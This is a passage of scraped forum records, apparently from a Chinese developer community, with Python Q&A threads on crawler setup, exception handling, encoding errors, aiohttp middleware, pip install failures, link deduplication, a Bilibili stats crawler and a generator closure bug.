）制定调仓周期</h1>\n<p>毕竟天天调仓光给券商交手续费了。这里设定的是一个月一调整。</p>\n<p>毕竟这里不是咱们研习代码的地方，以上逻辑看管清楚就好了。还是感觉下镭矿下这么复杂的逻辑，看看核心代码长啥样。</p>\n<img src=\"https://xqimg.imedao.com/15ad0e8b37f68563fdc0a96b.jpg!custom660.jpg\">\n<p>镭矿 raquant 还是挺棒的，上面这么复杂的逻辑涉及到 4 个技术指标，还是很少的代码能够完成。</p>\n<p>只是为了示意整个交易策略的结构啊，所以小编写这个策略没咋用心，但看收益还是明显强于基准。</p>\n<img src=\"https://xqimg.imedao.com/15ad0e8d37968593fa5c06bd.jpg!custom660.jpg\">\n<p>用量化平台构建交易策略，最典型的结构，包含哪四个部分？跟我复习一下：</p>\n<p>a.选择想要交易的股票</p>\n<p>b.选择时机入场</p>\n<p>c.指定止损、止盈策略</p>\n<p>d.制定调仓周期</p>\n<p>如果你真的是程序员，欢迎去<a href=\"http://www.raquant.com/qa/\" rel=\"nofollow\">镭矿论坛</a>看看一起探讨研究。</p>\n</div></div>"], "reply": "3", "tittle": "一个量化交易策略的常见结构（有图）", "comment": ["感觉做量化交易策略还不如使用大数据训练集来做机器学习，算法根据当前的价位，交易量，交易时段，均线，近期财报，，等等很多信息来决策，这样就不需要交易者自己懂交易规则了。", " 哈哈，你说的我们做过很长时间，没有用，感觉还是需要真正有想法有才华的人来做交易，太依赖于数据和机器做不出好的策略", " 在富途上有关注了一个交易大神 huashan 每天通过超短线交易熊牛证持续盈利，他一天的交易笔数在 100 到 200 多笔，这种超短线理论上应该是可以通过机器学习模式识别来做决策的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>收录待用，明天开始 Python 日记计划，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</p>\n<hr>\n<p>假设你已经在<a href=\"https://www.qcloud.com/product/cvm\" rel=\"nofollow\">云服务器</a>上搭建好了 Python 环境，我们将进入下一步：搭建 Python 爬虫环境。</p>\n<p>一直在终端编写 Python 爬虫是不现实的，除非你在学习阶段，当我们要正式开始编写爬虫的时候我们理所应当的需要一个爬虫环境了。</p>\n<p>第一部分：搭建爬虫环境\n考虑到学习、使用便捷，我们将使用 Sublime Text3 开发爬虫：<a href=\"https://www.sublimetext.com/3\" rel=\"nofollow\">https://www.sublimetext.com/3</a> ，进入 Sublime Text3 官网，按照你的系统下载相应的版本，我这里下载的是 Windows 64 位的。 <br>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429696640_961_1488429697700.PNG\"> <br></p>\n<p>下载好之后，安装 setup</p>\n<p>Next <br>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429731848_6847_1488429732899.PNG\"> <br></p>\n<p>选择安装目录，点击 next <br>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429792125_1788_1488429793366.PNG\"> <br></p>\n<p>勾选上:Add to explorer contect menu ，点击 next ，最后点击 Installer/Finish ，安装完成。安装完成之后到你之前配置的安装目录打开 Sublime Text3 ，你也可以复制一个快捷方式到桌面方便以后使用。</p>\n<p>现在你就可以使用 Sublime Text 来编写 Python 了，如若有什么不懂的地方可以访问 Sublime Text 的官网查看文档。编写完 Python 代码之后， F7 运行 Python 脚本，第一次运行的时候会出现以下界面，选择的一个行的 Python 即可。 <br>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429806690_5382_1488429807771.PNG\"> <br></p>\n<p>第二部分：学会安装 Python 库</p>\n<p>Python 适合做爬虫是因为：有无数的开源作者无私的在 Python 开源社区做贡献，强大的 Python 库为我们提供了很多便捷的操作。有三种方法安装 Python 库，具体方法可以访问：<a href=\"http://blog.csdn.net/jerry_1126/article/details/46574045\" rel=\"nofollow\">http://blog.csdn.net/jerry_1126/article/details/46574045</a></p>\n<p>Python 中绝大部分的库都可以使用 pip 进行安装， pip 也是最简单的安装方法，使用 pip 安装第三方库只需要使用命令： pip install + 库名，比如我需要安装一个叫 bs4 的库，我只需要在终端执行 pip install bs4 <br>\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429821861_8835_1488429823205.PNG\"> <br></p>\n<p>出现： Successfully collected packages:则表示安装成功。</p>\n<p>第三部分：你不得不知的 Python 库</p>\n<p>在编写爬虫的时候我们可能需要以下一些比较常用的库，这里我们做一个简单的介绍，方便后续的使用。</p>\n<p>1 、 Requests\nRequests 是用 Python 语言编写，基于 urllib ，采用 Apache2 Licensed 开源协议的 HTTP 库。它比 urllib 更加方便，可以节约我们大量的工作，完全满足 HTTP 测试需求。 Requests 的哲学是以 PEP 20 的习语为中心开发的，所以它比 urllib 更加 Pythoner</p>\n<p>安装命令： pip install resquests</p>\n<p>2 、 Beautifulsoup4\nBeautiful Soup 提供一些简单的、 python 式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序</p>\n<p>安装命令： pip install bs4</p>\n<p>3 、 Lxml\npython lxml 包用于解析 XML 和 html 文件，可以使用 xpath 和 css 定位元素</p>\n<p>安装方法： pip install lxml</p>\n<p>第四部分：寻找你需要的 Python 库</p>\n<p>当以上库不能满足你需求的时候，你就需要学会自己寻找 Python 库了。首先访问一个 git 项目：<a href=\"https://github.com/vinta/awesome-python\" rel=\"nofollow\">https://github.com/vinta/awesome-python</a></p>\n<p>在这个项目中，作者把所有的 Python 资源包括库资源等分成了几十个大类：数据挖掘、数据可视化、日期和时间处理、数据库相关……等等，在每个大类中归类了该类下的所有资源，并且该资源的首页有各个大类的索引。</p>\n<p>在这个大背景之下，假设我现在想找一个 Python 操作 MongoDB 的库，我们就首先点击最上面的索引： Database Drivers 直接跳转到数据库相关库的地方。 <br></p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429846906_7909_1488429848089.png\"> <br></p>\n<p>跳转之后，如下界面，我们就可以直接寻找到我们需要的库了。 <br></p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429862993_8847_1488429864479.png\"> <br></p>\n<p>当然，因为所有的资源都在同一个页面，所以我们同时可以使用浏览器自带的搜索功能，在 Chrome 下是 Ctrl+F12 ，在该页面直接搜我们需要的某个功能关键词，比如： MongoDB ， <br></p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488429876547_6589_1488429878074.png\"> <br></p>\n<p>当然，这样搜索出来的结果可能不仅仅是一条，就需要你自己排查以下哪一个才是你真正那个需要的库资源了。</p>\n<hr>\n<p>原文来自： <a href=\"https://www.qcloud.com/community/user/635207001488413960\" rel=\"nofollow\">https://www.qcloud.com/community/user/635207001488413960</a></p>\n</div></div>"], "reply": "目前尚无回", "tittle": "云服务器搭建 Python 爬虫环境", "comment": []},
{"content": ["<div class=\"topic_content\">for 循环中出现不可预测异常时,跳过本次循环并 print 出错误内容,继续执行下一次循环应该如何写?\r<br>现在使用的是 try...except...这样的,使用 continue 方法.\r<br>但是在实测中,如果连接失败,程序之间停止.\r<br>在代码中可以看出,是使用的 bs 抓取 url.程序循环到其中某一条连接时,内容里没有包含指定 a 标签的内容的话,也会报错并终止程序.\r<br>应该如何实现继续循环?\r<br>    for u in product_page_url:\r<br>        a = requests.get(u.strip())\r<br>        soup = BeautifulSoup(a.text, 'html.parser')\r<br>        try:\r<br>            clean_downurl = soup.find(class_ = 'downurl').a['href']\r<br>            b.append(clean_downurl)\r<br>            print u\r<br>        except:\r<br>            continue</div>"], "reply": "9", "tittle": "for 循环中出现异常时如何跳过继续处理?", "comment": ["可能 requests.get 这一步就异常了.", " 在执行 clean_downurl = soup.find(class_ = 'downurl').a['href'] 的时候。提示 soup 的错误，没有找到 a 标签。然后就终止程序了。这应该怎么写呀？", "第一个，你在 requests.get 之前并没有做 try ，所以在连接出错时会报错停止。\r", "第二个，我不知道你这个 BS 的 find 的语法对不对，但是我认为如果 try 不起作用，你可以换个方法，比如在后边做个判断，用 if 代替 try 。", "except 没有捉到异常？ 加个 Exception 试试？", " 第一个已经修改 try 的位置，已经解决了，第二个 BS 的语法经过测试是可以正常获取到值的。如果解决不了的话在考虑使用 if 吧。", "错误原因是啥，报错信息你能不能看懂", " #4 别瞎猜啊， try except 捕获所有异常， try except Exception 捕获 Exception 类型的异常。另外要避免 try except 不加异常类型的用法，这很容易吃掉不应该忽略的异常。", " 错误原因看得懂的，列表中的某些 url 不存在我找的指定连接，然后就 bs 就提示错误了， requests 的错误是因为网络有时不稳定，连接不到 url 然后报错的。", "clean_downurl = soup.find(class_ = 'downurl')\r", "if clean_downurl is not None:\r", "  clean_downurl = clean_downurl.a['href']\r", "我是习惯这样，如果变量获取了某个值，进行下一步操作前，先判断一下是否为空，是否和预期一致"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>在网上抓取的新闻，有时候会遇到这样的点，文字编码已经转换过了，但还是会报错\n'gbk' codec can't encode character '\\u2022' in position 20</p>\n<p>不知道该如何处理这个点。系统 是 python3.4+sublime</p>\n</div></div>"], "reply": "4", "tittle": "（四在农家•美丽乡村），这个点应该怎么处理", "comment": ["转成 UTF-8 应该能解决啊", "不 print 出来 是没事的。你的 windows stdout 不是 utf8 。", "执行 py 脚本前先在 cmd 执行一下 chcp 65001", "可能这个字符 gbk 没有收录，可以考虑用 GB18030"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>新手，最近练习 python 廖雪峰的实战教程，搭个博客，遇到问题，求助下。</p>\n<pre><code>async def init(loop):\n    await orm.create_pool(loop=loop, host='127.0.0.1', port=3306, user='root', password='password', db='awesome')\n    app = web.Application(loop=loop, middlewares=[logger_factory, response_factory])\n    init_jinja2(app, filters=dict(datetime=datetime_filter))\n    add_routes(app, 'handlers')\n    add_static(app)\n    srv = await loop.create_server(app.make_handler(), '127.0.0.1', 9000)\n    logging.info('server started at http://127.0.0.1:9000...')\n    return srv\n\nloop = asyncio.get_event_loop()\nloop.run_until_complete(init(loop))\nloop.run_forever()\n</code></pre>\n<p>上面的代码流程说明下：</p>\n<ol>\n<li>创建一个 web.app 实例(logger_factory 用来记录日志， response_factory 是用来构造 web.Response 对象)</li>\n<li>初始化 jinjia2</li>\n<li>注册路由(自定义方法，批量注册,所有定义的 handler 都在'handlers'这个 package 中)</li>\n<li>注册静态资源路由</li>\n</ol>\n<p>个人理解：</p>\n<p>假如发起一个 request ， GET /，当执行到 middlewares 时，是怎么执行的？我查文档 middlewares 作用其实就是装饰器，装饰 handler ，而且是倒序分别将 handler 装饰一遍。具体到代码就是， response_factory 这个自定义的 factory 接受 app 和最初自定义的 handler ，然后返回一个 handler ，并将该 handler 作为参数传递给 logger_factory 。也就是说，最终返回的 handler 已经是经过 response_factory ， logger_factory 装饰过的了。</p>\n<p>疑问如下：</p>\n<ol>\n<li>上面的一段个人理解不知道对不对</li>\n<li>但是看别人博客分析，当有 request 请求过来时，先由 logger_factory 处理，再经过中间一系列处理后，最后才由 response_factory 构造 web.Response 对象返回给客户端。跟我想的不一样，非常矛盾，不知道到底是啥样的流程。</li>\n<li>到这里我脑子一团浆糊，不知道一个 request 请求过来后，根据上面的代码段，服务端到底怎么处理 request 并返回结果给客户端的。整个流程到底不知道是怎么样的</li>\n</ol>\n<p>根据上面的片段代码，谁能给个服务端处理 request 请求，到返回结果给客户端的大概流程。</p>\n<p>再贴下廖雪峰的这部分完整<a href=\"https://github.com/michaelliao/awesome-python3-webapp/blob/day-07/www/app.py\" rel=\"nofollow\">代码地址</a></p>\n<p>希望小伙伴们指导下，非常感谢！</p>\n</div></div>"], "reply": "7", "tittle": "深夜求助，关于 aiohttp 搭建 web server 的几个问题。", "comment": ["强行回答一波好了。。。我们来看文档吧。这个其实是 aiohttp 里面的东西 ", "还有这里 ", " 等了一天，终于有人回了，感谢！你发的链接我之前都看过了，但是还是没搞懂 server 端在处理 request 请求到返回 response 对象这个过程中， middlewares 是如何工作的。看下这张图， ", " ，假设自定义了三个 middlefactory 函数分别是 m1,m2,m3 ，自定义的一个 handler 是 doFoo()，如果这样写， middlewares=[m1,m2,m3])，那么拦截器处理流程真的如途中所标箭头一样么？按我的理解是，拦截器不仅会作用于 request 对象，也会作用于 response 对象？可是按官方文档拦截器不是按倒序装饰 handler 的么？同时，能否描述下一个 request 到来时， middleware 到底怎么运行的，到最后返回一个 response 对象的过程？真的非常感谢！这个问题困扰我很久了！", " 拦截器不是装饰 handler 的么，为什么还能处理 request 请求？", "首先感觉你对 handler 的概念理解的有点问题， handler 本身就是接受 request 然后返回 response 的。所以你可以看到廖雪峰老师的项目里面 handlers.py 都是各种处理不同 request 的 handler 函数，而 middleware 是一种装饰 request handler 的东西，它接受处理 request handler 之后继续返回装饰后的 handler 。关于 m1,m2,m3 顺序问题这个其实很简单，你在每个函数里面 logging.info 就好了啊，很直观的可以看出调用顺序。另外这里有一份注释版的代码你可以参考一下， ", "拦截器并没有处理 request 请求，它只是装饰了请求最终请求还是会让对应的 handler 去处理的", " 非常感谢！终于找到偏差之处了。还是装饰器那边理解有问题。谢谢指导！"]},
{"content": ["<div class=\"topic_content\">Could not find a version that satisfies the requirement sqlmap (from versions: )\r<br>No matching distribution found for sqlmap\r<br>\r<br>有的包可以正常安装 有的会出现像上面那样说版本不符合 不知道是什么原因？\r<br>T T新人已疯\r<br>\r<br>还有 要怎么放图片？？天啊想放截图</div>"], "reply": "6", "tittle": "求助 用 pip 安装包时出现问题", "comment": ["可能有些包不支持你当前的 python 版本", "我在 python2,3 下都是可以捜到这个包的，所以你试试 `pip install sqlmap==1.1.3`", "检查下名字有没有写对，或者只去 pypi 主页搜下，看看具体的版本要求， check 一下你本地的版本。 实在不行，手动安装", "可以试试 yum install python-包名 或者 apt-get install python-包名。大部分都可以这样下载。", "应该就是安装包不支持你的 python 版本，如果本地的版本比较旧的话，可以试试 update 命令更新本地版本，如果是最新版本的话，建议直接到官网上获取链接，或者尝试别的下载方式吧", "谢谢大家！ 我的是 win10..用的是 python27 。 导入包 bs4 ， pyExcelerator ， selenium 都是成功的，包 xml 就显示版本不符合了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>第一步，爬取链接存储到 MongoDB 中\n第二步，爬取每个链接的详细信息，存储爬取成功的链接及信息</p>\n<p>第二步爬取的过程不会很顺利，有时需要计算未完成的链接，再进行爬取，我目前是这样处理的\n把第一步的链接存储在 list 里，再转成集合（ set)\n把第二步的链接存储在 list 里，再转成集合（ set)\n未完成的链接 = 第一步的 set - 第二步的 set</p>\n<p>遇到的问题是，如果链接数比较小的时候，这样处理速度比较快，当链接数达到几百万时，这样处理的速度不是很理想，请问有没有高效的处理方法呢？</p>\n</div></div>"], "reply": "12", "tittle": "Python 爬虫时如何高效的链接去重", "comment": ["用 redis 去重比较粗暴", "布隆过滤器", "最近在爬一个站，第一步的数据存数据库了, django 下面放一个 scrapy 存取去重很方便，第二步用第一步的数据，使用 celery 的 task 定时爬取  我的第二步是下图片 所以开了好几台小机器分开下载的，下载结果直接修改 主数据库；缺点是数据库访问有点频繁，负载有点高~     感觉  django + scrapy + celery 做类似的项目简直是爽~", "\r", "目前用 redis 去重，抓了微信，微博，网站，视频总共加载一块得 1000+个，用的很丝滑。", " 赞， 布隆过滤器是标准做法", "  bloomfliter 有一定概率产生错误，要看下业务能不能允许这种情况", " 谢啦，我去查查这方面的资料", " 十分感谢！", " 谢啦！:)", " 感谢！", " 我去研究一下，谢谢！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>从今天开始一步步完成 Python 日记计划，和 Python 相关的收录待用，修改转载已取得<a href=\"https://www.qcloud.com/\" rel=\"nofollow\">腾讯云</a>授权</p>\n<hr>\n<p>在以上两篇文章中我们已经在<a href=\"https://www.qcloud.com/product/cvm\" rel=\"nofollow\">腾讯云服务器</a>上搭建好了 Python 爬虫环境了，下一步就是在云服务器上爬上我们的爬虫，抓取我们想要的数据：\n<a href=\"https://www.qcloud.com/community/article/441933001488429166\" rel=\"nofollow\"> [腾讯云的 1001 种玩法] 云服务器搭建 Python 环境</a>\n<a href=\"https://www.qcloud.com/community/article/568730001488429859\" rel=\"nofollow\"> [腾讯云的 1001 种玩法] 云服务器搭建 Python 爬虫环境</a></p>\n<p>今天我们要抓去的目标网站是，国内最大的年轻人潮流文化娱乐社区：<a href=\"http://www.bilibili.com/\" rel=\"nofollow\">哔哩哔哩 - ( ゜- ゜)つロ 干杯~ - bilibili</a> B 站自建站以来已经收纳了大约六百多万的视频，那么今天我们就写一个爬虫去征服这六百多万条视频信息。</p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488513362072_8527_1488513364354.png\"></p>\n<p>我们想抓取的就是上面的播放次数、评论数量、硬币数量以及收藏数量，接着我们开始。</p>\n<p>1 、先分析\n首先第一步这些数据在哪里？我们第一个想到的就是在网页源码里面，于是我们查看源码，搜索相关信息。\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488513747525_2191_1488513750151.png\"></p>\n<p>遗憾的是我们会发现，信息并不在源码中；紧接着我们打开 chrome 开发者工具查看请求信息。\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488516453368_9522_1488516458787.png\"></p>\n<p><a href=\"http://api.bilibili.com/archive_stat/stat?callback=jQuery172011470242640208683_1488515896642&amp;aid=8904657&amp;type=jsonp&amp;_=1488515897422\" rel=\"nofollow\">http://api.bilibili.com/archive_stat/stat?callback=jQuery172011470242640208683_1488515896642&amp;aid=8904657&amp;type=jsonp&amp;_=1488515897422</a></p>\n<p>我们可以对以上的 url 进行修剪，删除一些不是必须要的参数。我们先观察这个 url ， aid 是这个视频的 id 唯一标识不能删除，我们可以先把其余的参数都删掉试试看，如果不成功我们在一一加参数测试。</p>\n<p><a href=\"http://api.bilibili.com/archive_stat/stat?aid=8904657\" rel=\"nofollow\">http://api.bilibili.com/archive_stat/stat?aid=8904657</a></p>\n<p><img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488517262043_6743_1488517264369.png\"></p>\n<p>显然，删除了非必要参数之后对内容毫无影响，所以我们只需要知道每个视频的 aid 就可以抓取所有的视频信息了。那么 B 站的视频 aid 是怎么编号的呢？我们可以多观察以下 aid 会发现这个 aid 是一个自动增长的主键，从 1 开始递增。于是我们代码思路有就了。</p>\n<p>2 、写代码\n使用 requests 库来请求获取数据，并使用 Python 的内置库 Json 来提取数据。\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488518293291_5096_1488518295603.png\"></p>\n<p>现在已经可以抓取单个视频信息了，让你的小爬虫遍历整个 B 站的视频。\n<img alt=\"\" src=\"//blog-10039692.file.myqcloud.com/1488518558918_2042_1488518561389.png\"></p>\n<p>现在你只需要把你的爬虫一直开在服务器上就 ok 了。</p>\n<hr>\n<p>原文来自： <a href=\"https://www.qcloud.com/community/user/635207001488413960\" rel=\"nofollow\">https://www.qcloud.com/community/user/635207001488413960</a></p>\n</div></div>"], "reply": "2", "tittle": "爬虫扒下 bilibili 视频信息", "comment": ["B 站算是对爬虫最\"友好\"的视频网站了。。|ω･`)", " 是呀哈哈哈"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>make_index 这个函数就是简单的做一个倒排索引，将出现了某种语言的文章与该语言关联起来，返回的结果是一个列表，列表中每个元素是一个 tuple 。</p>\n<pre><code>from collections import namedtuple\n\nWikipediaArticle = namedtuple(\"WikipediaArticle\", [\"title\", \"text\"])\n\n\ndef make_index(langs, articles):\n    result = []\n    for lang in langs:\n        # 创建包含该 lang 的文章的生成器\n        article_gen = (article for article in articles if article.text.find(lang) &gt;= 0) \n        result.append((lang, article_gen))\n    return result\n\nif __name__ == '__main__':\n    articles = [\n        WikipediaArticle('1', \"Groovy is pretty interesting, and so is Erlang\"),\n        WikipediaArticle('2', \"Scala and Java run on the JVM\"),\n        WikipediaArticle('3', \"Scala is not purely functional\"),\n        WikipediaArticle('4', \"The cool kids like Haskell more than Java\"),\n        WikipediaArticle('5', \"Java is for enterprise developers\")\n    ]\n\tlangs = [\"Scala\", \"Java\", \"Groovy\", \"Haskell\", \"Erlang\"]\n    for item in make_index(langs, articles):\n        print(item[0], list(item[1])\n        \n</code></pre>\n<p>然后跑出来的结果是：</p>\n<pre><code>    Scala [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n    Java [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n    Groovy [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n    Haskell [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n    Erlang [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n</code></pre>\n<p>很明显这结果有问题，取得都是第一条数据， 但是如果在函数内部做一点修改，会得到以下结果：</p>\n<pre><code># result.append((lang, article_gen)) 这一句改成 result.append((lang, list(article_gen)))\n('Scala', [WikipediaArticle(title='2', text='Scala and Java run on the JVM'), WikipediaArticle(title='3', text='Scala is not purely functional')])\n('Java', [WikipediaArticle(title='2', text='Scala and Java run on the JVM'), WikipediaArticle(title='4', text='The cool kids like Haskell more than Java'), WikipediaArticle(title='5', text='Java is for enterprise developers')])\n('Groovy', [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')])\n('Haskell', [WikipediaArticle(title='4', text='The cool kids like Haskell more than Java')])\n('Erlang', [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')])\n</code></pre>\n<p>感觉好奇怪，为什么会这样，求解， 在函数里面解开生成器和在函数外面解开有什么区别吗？</p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>我把return换成yield之后，又能得到预期的结果</p>\n<pre><code>def make_index(langs, articles):\n    for lang in langs:\n        article_gen = (article for article in articles if article.text.find(lang) &gt;= 0)\n        yield lang, article_gen\n\nfor item in make_index(langs, articles):\n       print(item, list(item[1]))\n\n\n输出：\n('Scala', &lt;generator object make_index.&lt;locals&gt;.&lt;genexpr&gt; at 0x00EFBDB0&gt;) [WikipediaArticle(title='2', text='Scala and Java run on the JVM'), WikipediaArticle(title='3', text='Scala is not purely functional')]\n('Java', &lt;generator object make_index.&lt;locals&gt;.&lt;genexpr&gt; at 0x00F091E0&gt;) [WikipediaArticle(title='2', text='Scala and Java run on the JVM'), WikipediaArticle(title='4', text='The cool kids like Haskell more than Java'), WikipediaArticle(title='5', text='Java is for enterprise developers')]\n('Groovy', &lt;generator object make_index.&lt;locals&gt;.&lt;genexpr&gt; at 0x00EFBDB0&gt;) [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n('Haskell', &lt;generator object make_index.&lt;locals&gt;.&lt;genexpr&gt; at 0x00F091E0&gt;) [WikipediaArticle(title='4', text='The cool kids like Haskell more than Java')]\n('Erlang', &lt;generator object make_index.&lt;locals&gt;.&lt;genexpr&gt; at 0x00EFBDB0&gt;) [WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')]\n</code></pre>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>问题解决了，大概就是一个和\n<a href=\"https://docs.python.org/3.6/faq/programming.html#why-do-lambdas-defined-in-a-loop-with-different-values-all-return-the-same-result\" rel=\"nofollow\">https://docs.python.org/3.6/faq/programming.html#why-do-lambdas-defined-in-a-loop-with-different-values-all-return-the-same-result</a>\n类似的问题，for循环结束后，迭代器中绑定的lang值都执行了langs这个列表中最后一个元素（Erlang）， 所以导致所有迭代器的结果都是Erlang的结果。</p>\n<p>解决这个问题的办法可以参照@siteshen说的。</p>\n<pre><code>def make_index(langs, articles):\n    res = []\n    for lang in langs:\n        res.append((lang, (lambda arg: (article for article in articles if article.text.find(arg) &gt;= 0))(lang)))\n    return res\n</code></pre>\n<p>感谢各位大神解惑！~</p>\n</div></div>"], "reply": "28", "tittle": "大吃一惊！ 函数里面写生成器解析（生成器表达式），居然会这样.....", "comment": ["\r", "\r", "学好基本知识", " 大哥，你有认真看我的描述吗，我看你发的链接是教程，完全没解答问题呢。希望能给建设性的指教。", "兄弟\r", "```\r", "[article for article in articles if article.text.find(lang) >= 0]\r", "```", "居然不是震惊....", "不过输出成这样有点奇怪\r", "按理说不该是<generator object...>吗\r", "觉得该是 print 的锅", "为什么我试了一下没问题呢\r", "```\r", "WikipediaArticle(title='2', text='Scala and Java run on the JVM')\r", "WikipediaArticle(title='2', text='Scala and Java run on the JVM')\r", "WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')\r", "WikipediaArticle(title='4', text='The cool kids like Haskell more than Java')\r", "WikipediaArticle(title='1', text='Groovy is pretty interesting, and so is Erlang')\r", "```", " 怎么输出成这样的......", " 还是有问题, 我测试错了\r", "```python\r", "        article_gen = (article for article in articles if article.text.find(lang) >= 0)\r", "        print(lang, next(article_gen))\r", "        result.append((lang, article_gen))\r", "```\r", "我实在里面试了一下， 最后输出的还是跟楼主发的一样。", " 这么短一个程序有混用 tab 和空格，少括弧，先生成 tuple 又莫明其妙转换成 list 这么多错误，所以叫你学好基础知识。", "楼主明天就来 UC 上班，待遇从优", "25          87 SETUP_LOOP              50 (to 140)\r", "             90 LOAD_GLOBAL              1 (make_index)\r", "             93 LOAD_FAST                1 (langs)\r", "             96 LOAD_FAST                0 (articles)\r", "             99 CALL_FUNCTION            2 (2 positional, 0 keyword pair)\r", "            102 GET_ITER\r", "        >>  103 FOR_ITER                33 (to 139)\r", "            106 STORE_FAST               2 (item)\r", "\r", " 26         109 LOAD_GLOBAL              2 (print)\r", "            112 LOAD_FAST                2 (item)\r", "            115 LOAD_CONST              16 (0)\r", "            118 BINARY_SUBSCR\r", "            119 LOAD_GLOBAL              3 (list)\r", "            122 LOAD_FAST                2 (item)\r", "            125 LOAD_CONST              17 (1)\r", "            128 BINARY_SUBSCR\r", "            129 CALL_FUNCTION            1 (1 positional, 0 keyword pair)\r", "            132 CALL_FUNCTION            2 (2 positional, 0 keyword pair)\r", "            135 POP_TOP\r", "            136 JUMP_ABSOLUTE          103\r", "        >>  139 POP_BLOCK\r", "        >>  140 LOAD_CONST               0 (None)\r", "            143 RETURN_VALUE", "寄存器的锅?求大神解释.....", "生成器只能读取一次，自己想想逻辑哪里有问题吧\r", "提示: list(<generator object>) in for", "局部变量 lang 被所有生成器表达式捕获并共享，表达式被遍历输出的时候才会延迟获取 lang 的值，此时循环已经结束， lang 获取的是最语言列表的最后一个值", "原因： generator 在取 next 时才去执行的代码，执行代码时 lang 的值是最后一次的值，可以改成这样看看效果：\r", "article_gen = ((lang, article) for article in articles if article.text.find(lang) >= 0) 这里返回的 lang 就是最后一个值。\r", "\r", "暂时没想到更好的在循环里生成 generator 的办法，我会避免使用。参照之前经典的 js 面试题改了下代码：\r", "article_gen = (lambda l: (article for article in articles if article.text.find(l) >= 0))(lang)", " 我用的不是列表解析啊，用的是生成器表达式，如果只是 print 生成器，就是 generator objec ， 但是我 print 的时候把他转成列表了。\r", "所有我还是不明白为什么，转成列表之后，就只剩一个元素了。", " 不好意思，可能是我 markdown 没写好，但是我代码都是 pep8 检测了的，不可能会有什么语法上的错误或者多括号少括号的问题，至于你说的生成 tuple 和 list ，我觉得你可能没看懂代码。转成 list 的原因是要把生成器的元素释放出来。", "原因是变量的作用域问题\r", "\r", "gen_generator = lambda lang, articles: (article for article in articles if article.text.find(lang) >= 0)\r", "\r", "in loop: \r", "\r", "article_gen =  gen_generator(lang, articles)", " 可是我的结果是五个 （ String ， generator ） tuple ：\r", "('Scala', <generator object make_index.<locals>.<genexpr> at 0x0061BDB0>)\r", "('Java', <generator object make_index.<locals>.<genexpr> at 0x006291E0>)\r", "('Groovy', <generator object make_index.<locals>.<genexpr> at 0x0061BDB0>)\r", "('Haskell', <generator object make_index.<locals>.<genexpr> at 0x006291E0>)\r", "('Erlang', <generator object make_index.<locals>.<genexpr> at 0x0061BDB0>)\r", "\r", "然后对每个 tuple 的生成器利用 list 函数，为啥返回的结果是一毛一样的。我就是这点存在疑惑。", "你 article 还是当年的 article ， lang 已经不是当年的 lang 了。", " 看错了，是无意义的把 list 转换成 list\r", "\r", "list(item[1])", " .......item[1]是 generator\r", "  @", "   @", " 嗯，我图形化代码的时候，发现所有的 generator 都指向了最后那个 lang 为 Erlang 的结果。 看了确实是 article 没变， lang 却变了。谢谢你们，我大概知道出错的原因了。但是还是不太理解里面的过程，请问哪里可以多了解这方面的知识？~", " 你真傻还是装傻啊\r", "\r", "result.append((lang, list(article_gen)))\r", "\r", "你说 item[1]是不是 generator", " \r", "Finding closure with closures : ", " 你是这里找到的吧 # result.append((lang, article_gen)) 这一句改成 result.append((lang, list(article_gen))) \r", " 这里是为了说明问题所做的比较啊大哥....关注点也是清奇。\r", "\r", "所以请好好审题。明确别人问的是什么。然后丢合适的链接。要么就不答，要么就认真答。大家都是奔着解决问题去的。你这种回答态度很让人不舒服。 还好其他 v 友读懂了题目，给我上了一课。", " 但其实他给的链接中就有你要的答案:  ", " 确实能找到 @", " 不好意思，自己打脸了，我这下真心诚意接收你的建议，补基础去。收回前面的话~ sorry!!!", "这是闭包的一个容易误解的地方嘛，等你把 generator 转成 list 的时候， generator 的代码开始执行，这时 lang 的值是 Erlang"]},
